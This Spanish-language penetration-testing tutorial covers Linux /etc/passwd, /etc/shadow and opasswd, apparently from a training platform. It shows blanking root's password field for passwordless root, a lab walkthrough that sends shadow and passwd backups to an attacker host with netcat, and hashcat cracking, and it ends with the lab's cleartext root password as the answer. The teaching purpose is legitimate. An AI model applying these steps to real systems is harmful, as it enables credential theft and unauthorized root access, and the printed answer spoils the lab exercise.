
# Passwd, Shadow y Opasswd

Las distribuciones basadas en Linux pueden utilizar muchos mecanismos de autenticación diferentes. Uno de los mecanismos estándar y más comúnmente utilizado son los [Pluggable Authentication Modules](https://web.archive.org/web/20220622215926/http://www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html)( `PAM`). Los módulos utilizados para esto se llaman `pam_unix.so` o `pam_unix2.so` y están ubicados en `/usr/lib/x86_x64-linux-gnu/security/` en distribuciones basadas en Debian. Estos módulos administran la información del usuario, la autenticación, las sesiones, las contraseñas actuales y las contraseñas antiguas. Por ejemplo, si queremos cambiar la contraseña de nuestra cuenta en el sistema Linux con `passwd`, se llama a PAM, que toma las precauciones adecuadas y almacena y maneja la información en consecuencia.

El módulo estándar de administración `pam_unix.so` utiliza llamadas API estandarizadas desde las bibliotecas y archivos del sistema para actualizar la información de la cuenta. Los archivos estándar que se leen, administran y actualizan son `/etc/passwd`y `/etc/shadow`. PAM también tiene muchos otros módulos de servicio, como LDAP, mount o Kerberos.

***

## <mark style="color:purple;">Passwd</mark>

El archivo `/etc/passwd` contiene información sobre cada usuario existente en el sistema y puede ser leído por todos los usuarios y servicios. Cada entrada en el `/etc/passwd` identifica a un usuario en el sistema. Cada entrada tiene siete campos que contienen un formulario de base de datos con información sobre el usuario en particular, donde dos puntos ( `:`) separan la información. En consecuencia, una entrada de este tipo podría verse así:

### **Formato de contraseña**

<table data-header-hidden><thead><tr><th width="141"></th><th width="51"></th><th width="148"></th><th width="52"></th><th width="84"></th><th width="51"></th><th width="89"></th><th width="53"></th><th width="174"></th><th width="53"></th><th width="177"></th><th width="56"></th><th></th></tr></thead><tbody><tr><td><code>cry0l1t3</code></td><td><code>:</code></td><td><code>x</code></td><td><code>:</code></td><td><code>1000</code></td><td><code>:</code></td><td><code>1000</code></td><td><code>:</code></td><td><code>cry0l1t3,,,</code></td><td><code>:</code></td><td><code>/home/cry0l1t3</code></td><td><code>:</code></td><td><code>/bin/bash</code></td></tr><tr><td>Nombre de inicio de sesión</td><td></td><td>Información de contraseña</td><td></td><td>UID</td><td></td><td>GUID</td><td></td><td>Nombre completo/ comentarios</td><td></td><td>Directorio de inicio</td><td></td><td>Shell</td></tr></tbody></table>

El campo más interesante para nosotros es el campo Información de contraseña en esta sección porque aquí puede haber diferentes entradas. Uno de los casos más raros que podemos encontrar sólo en sistemas muy antiguos es el hash de la contraseña cifrada en este campo. Los sistemas modernos tienen los valores hash almacenados en el archivo `/etc/shadow`, al que volveremos más adelante. Sin embargo, `/etc/passwd`es legible en todo el sistema, lo que brinda a los atacantes la posibilidad de descifrar las contraseñas si los hashes se almacenan aquí.

Por lo general, encontramos el valor `x` en este campo, lo que significa que las contraseñas se almacenan de forma cifrada en el archivo `/etc/shadow`. Sin embargo, también puede ser que el `/etc/passwd` se pueda escribir por error. Esto nos permitiría borrar este campo para el usuario `root` de modo que el campo de información de contraseña esté vacío. Esto hará que el sistema no envíe una solicitud de contraseña cuando un usuario intente iniciar sesión como `root`.

### **Editando /etc/passwd - Antes**

```bash
root:x:0:0:root:/root:/bin/bash
```

### **Editando /etc/passwd - Después**

```bash
root::0:0:root:/root:/bin/bash   # Le quitamos la x
```

### **Acceso root sin contraseña**

```shell-session
[cry0l1t3@parrot]─[~]$ head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash


[cry0l1t3@parrot]─[~]$ su

[root@parrot]─[/home/cry0l1t3]#
```

Aunque los casos mostrados rara vez ocurrirán, debemos prestar atención y estar atentos a las brechas de seguridad porque hay aplicaciones que requieren que establezcamos permisos específicos para carpetas enteras. Si el administrador tiene poca experiencia con Linux o las aplicaciones y sus dependencias, puede que le dé permisos de escritura al directorio `/etc` y se olvide de corregirlos.

***

## <mark style="color:purple;">Shadow</mark>

Dado que la lectura de los valores hash de las contraseñas puede poner en peligro todo el sistema, se desarrolló un archivo `/etc/shadow` que tiene un formato similar a `/etc/passwd` pero solo es responsable de las contraseñas y su gestión. Contiene toda la información de contraseña de los usuarios creados. Por ejemplo, si no hay ninguna entrada en el `/etc/shadow` para un usuario en `/etc/passwd`, el usuario se considera no válido. Además, el `/etc/shadow` solo lo pueden leer los usuarios que tienen derechos de administrador. El formato de este archivo se divide en `9 campos`:

### **Formato de etc/shadow**

<table data-header-hidden><thead><tr><th width="139"></th><th width="50"></th><th width="311"></th><th width="51"></th><th width="144"></th><th width="60"></th><th width="130"></th><th width="52"></th><th></th><th width="68"></th><th width="121"></th><th width="120"></th><th width="119"></th><th></th></tr></thead><tbody><tr><td><code>cry0l1t3</code></td><td><code>:</code></td><td><code>$6$wBRzy$...SNIP...x9cDWUxW1</code></td><td><code>:</code></td><td><code>18937</code></td><td><code>:</code></td><td><code>0</code></td><td><code>:</code></td><td><code>99999</code></td><td><code>:</code></td><td><code>7</code></td><td><code>:</code></td><td><code>:</code></td><td><code>:</code></td></tr><tr><td>Nombre de usuario</td><td></td><td>Contraseña cifrada</td><td></td><td>Último cambio de contraseña</td><td></td><td>Mín. PW age</td><td></td><td>Max. PW age</td><td></td><td>Periodo de advertencia</td><td>Periodo de inactividad</td><td>Fecha de caducidad</td><td>No usado</td></tr></tbody></table>

### **etc/shadow**

```shell-session
[cry0l1t3@parrot]─[~]$ sudo cat /etc/shadow

root:*:18747:0:99999:7:::
sys:!:18747:0:99999:7:::
...SNIP...
cry0l1t3:$6$wBRzy$...SNIP...x9cDWUxW1:18937:0:99999:7:::
```

Si el campo de contraseña contiene un carácter, como `!`o `*`, el usuario no puede iniciar sesión con una contraseña de Unix. Sin embargo, aún se pueden utilizar otros métodos de autenticación para iniciar sesión, como Kerberos o la autenticación basada en claves. El mismo caso se aplica si el campo `contraseña cifrada` está vacío. Esto significa que no se requiere contraseña para iniciar sesión. Sin embargo, esto puede llevar a que programas específicos nieguen el acceso a funciones. La `contraseña cifrada` también tiene un formato particular mediante el cual también podemos conocer alguna información:

* `$<type>$<salt>$<hashed>`

Como podemos ver aquí, las contraseñas cifradas se dividen en tres partes. Los tipos de cifrado nos permiten distinguir entre los siguientes:

### **Tipos de algoritmos**

* `$1$` – MD5
* `$2a$` – Blowfish
* `$2y$` – Eksblowfish
* `$5$` – SHA-256
* `$6$` – SHA-512

De forma predeterminada, el método de cifrado SHA-512 ( `$6$`) se utiliza en las distribuciones de Linux más recientes. También encontraremos otros métodos de cifrado que luego podremos intentar descifrar en sistemas más antiguos. Discutiremos cómo funciona el craqueo en un momento.

***

## <mark style="color:purple;">Opasswd</mark>

La biblioteca PAM (`pam_unix.so`) puede evitar la reutilización de contraseñas antiguas. El archivo donde se almacenan las contraseñas antiguas es el `/etc/security/opasswd`. También se requieren permisos de administrador/root para leer el archivo si los permisos para este archivo no se han cambiado manualmente.

### **Leyendo /etc/security/opasswd**

```shell-session
afsh4ck@kali$ sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

Si observamos el contenido de este archivo, podemos ver que contiene varias entradas para el usuario `cry0l1t3`, separadas por una coma (`,`). Otro punto crítico al que hay que prestar atención es el tipo de hash que se ha utilizado. Esto se debe a que el algoritmo `MD5`(`$1$`) es mucho más fácil de descifrar que SHA-512. Esto es especialmente importante para identificar contraseñas antiguas y tal vez incluso su patrón, porque a menudo se utilizan en varios servicios o aplicaciones. Aumentamos muchas veces la probabilidad de adivinar la contraseña correcta según su patrón.

***

## <mark style="color:purple;">Descifrando credenciales en Linux</mark>

Una vez que hayamos recopilado algunos hashes, podemos intentar descifrarlos de diferentes maneras para obtener las contraseñas en texto sin cifrar.

### **Unshadow**

La técnica de **unshadow** en sistemas Linux se refiere al proceso de combinar el archivo de contraseñas `/etc/passwd` y el archivo de contraseñas protegidas `/etc/shadow` para generar una lista que pueda ser utilizada para ataques de fuerza bruta o crackeo de contraseñas.

El comando **unshadow** toma ambos archivos y genera un archivo de salida que contiene la información del usuario junto con las contraseñas encriptadas.

```shell-session
afsh4ck@kali$ sudo cp /etc/passwd /tmp/passwd.bak 
afsh4ck@kali$ sudo cp /etc/shadow /tmp/shadow.bak 
afsh4ck@kali$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

### **Hashcat - Cracking Hashes Unshadow**

```shell-session
afsh4ck@kali$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/wordlists/rockyou.txt -o /tmp/unshadowed.cracked
```

### **Hashcat - Descifrando hashes MD5**

```shell-session
afsh4ck@kali$ cat md5-hashes.list

qNDkF0zJ3v8ylCOrKB0kt0
E9uMSmiQeRh4pAAgzuvkq1
```

```shell-session
afsh4ck@kali$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

***

## <mark style="color:purple;">Caso práctico</mark>

Examine el objetivo utilizando las credenciales del usuario Will y descubra la contraseña del usuario "root". Luego, envíe la contraseña como respuesta.

{% hint style="info" %}
Vamos a usar las credenciales encontradas en la sección anterior para acceder por SSH con el usuario Will
{% endhint %}

```bash
ssh will@10.129.7.121
TUqr7QfLTLhruhVbCP
```

Al acceder a `.bash_history` encontramos la ruta `/.backups` que contiene los archivos `.bak` del passwd y shadow

```bash
will@nix01:~$ ls -la
.backups  .bash_history  .bash_logout  .bashrc  .cache  .config  .profile

# Accedemos a .bash_history
will@nix01:~$ cat .bash_history 
cd
mkdir .backups
cd
ls -la
tree .
tree ...
ls -la
tree ...
ls -la
cd ...
ls -la

will@nix01:~$ cd .backups/

will@nix01:~/.backups$ tree
.
├── passwd.bak
└── shadow.bak

0 directories, 2 files

will@nix01:~/.backups$ ls -la
passwd.bak  shadow.bak
```

```shell-session
will@nix01:~/.backups$ cat shadow.bak 
root:$6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u.6dSvct8AYVVI6ClJmY8ZZuPDP7IoXRJhYz4U8.DJUlilUw2EfqhXg.:19032:0:99999:7:::
kira:$6$Qsp/wU8vd2AfZLNX$C9jsDq36v3SjM8J1RNgrPkvFUxmOUoHcLUhLFVSCxjH1OcmfOsYaOyV4Flq03xEws8EpIbqkGswGRkrfhMCS9.:19032:0:99999:7:::
will:$6$9ydKhjrXsYb9DuQ3$mpajQn/OhVmuz7/BZxCibO.m7aYPiBnjj2EV2NTE4i2N63QmV7uajroEzbl6RjYVyOOySJmtt949WG9wVB6CV0:19032:0:99999:7:::
sam:$6$0ZQY96jLR9VVZ/Jk$EWbFnNQW21KlbFwt7oQXoGvuoafNuUtjnNl.Dbih3WjbsletfbYN25C1rZgFvc8Xfo5cXTuJr02yTMK7pU9az1:19032:0:99999:7:::
...
```

Vamos a llevarnos estos 2 archivos a nuestro host de atacante y vamos a hacer la técnica de Unshadow

```shell-session
will@nix01:~/.backups$ nc 10.10.15.239 4444 -w3 < shadow.bak
will@nix01:~/.backups$ nc 10.10.15.239 4444 -w3 < passwd.bak
```

```shell-session
afsh4ck@kali$ nc -nlvp 4444 > shadow.bak
listening on [any] 4444 ...
connect to [10.10.15.239] from (UNKNOWN) [10.129.7.121] 60116

afsh4ck@kali$ nc -nlvp 4444 > passwd.bak
listening on [any] 4444 ...
connect to [10.10.15.239] from (UNKNOWN) [10.129.7.121] 60116
```

### Unshadow

```shell-session
afsh4ck@kali$ unshadow passwd.bak shadow.bak > unshadow.hashes
```

<figure><img src="/files/rYlLoRa2DWnNKMSaMcgk" alt=""><figcaption></figcaption></figure>

Una vez tenemos el `unshadow.hashes` vamos a crackearlo con hashcat, utilizando el archivo `mut_password.txt` de contraseñas mutadas que hemos creado en este sección, en vez del diccionario rockyou:

```shell-session
afsh4ck@kali$ ls
custom.rule  mut2_password.list  mut_password.list    password.list  username.list
love.txt     mut_love.txt        password-short.list  root.hash     
```

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 1800 unshadow.hashes mut_password.list 

hashcat (v6.2.6) starting

Session..........: hashcat
Status...........: Running
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: unshadow.hashes
Time.Started.....: Tue Apr  2 11:35:09 2024 (10 secs)
Time.Estimated...: Tue Apr  2 11:39:47 2024 (4 mins, 28 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (mut_password.list)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1012 H/s (13.59ms) @ Accel:80 Loops:1024 Thr:1 Vec:2
Recovered........: 1/4 (25.00%) Digests (total), 0/4 (0.00%) Digests (new), 1/4 (25.00%) Salts
Progress.........: 13600/376176 (3.62%)
Rejected.........: 0/13600 (0.00%)
Restore.Point....: 3360/94044 (3.57%)
Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:4096-5000
Candidate.Engine.: Device Generator
Candidates.#1....: 7894562008! -> 78945698
Hardware.Mon.#1..: Util: 91%

$6$0ZQY96jLR9VVZ/Jk$EWbFnNQW21KlbFwt7oQXoGvuoafNuUtjnNl.Dbih3WjbsletfbYN25C1rZgFvc8Xfo5cXTuJr02yTMK7pU9az1:B@tm@n2022!

$6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u.6dSvct8AYVVI6ClJmY8ZZuPDP7IoXRJhYz4U8.DJUlilUw2EfqhXg.:J0rd@n5

...
```

{% endcode %}

También podríamos centrarnos solo en el hash de root, que es el que nos interesa:

{% code title="root.hash" %}

```
$6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u.6dSvct8AYVVI6ClJmY8ZZuPDP7IoXRJhYz4U8.DJUlilUw2EfqhXg.
```

{% endcode %}

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 1800 root.hash mut_password.list 

hashcat (v6.2.6) starting

Session..........: hashcat
Status...........: Running
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u...fqhXg.
Time.Started.....: Tue Apr  2 11:22:58 2024 (29 secs)
Time.Estimated...: Tue Apr  2 11:24:20 2024 (53 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (mut_password.list)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1136 H/s (24.51ms) @ Accel:288 Loops:512 Thr:1 Vec:2
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 33120/94044 (35.22%)
Rejected.........: 0/33120 (0.00%)
Restore.Point....: 33120/94044 (35.22%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1536-2048
Candidate.Engine.: Device Generator
Candidates.#1....: Family2008 -> Fernand04!
Hardware.Mon.#1..: Util: 97%

$6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u.6dSvct8AYVVI6ClJmY8ZZuPDP7IoXRJhYz4U8.DJUlilUw2EfqhXg.:J0rd@n5
```

{% endcode %}

Obtenemos correctamente la contraseña en plano del usuario root: `J0rd@n5`
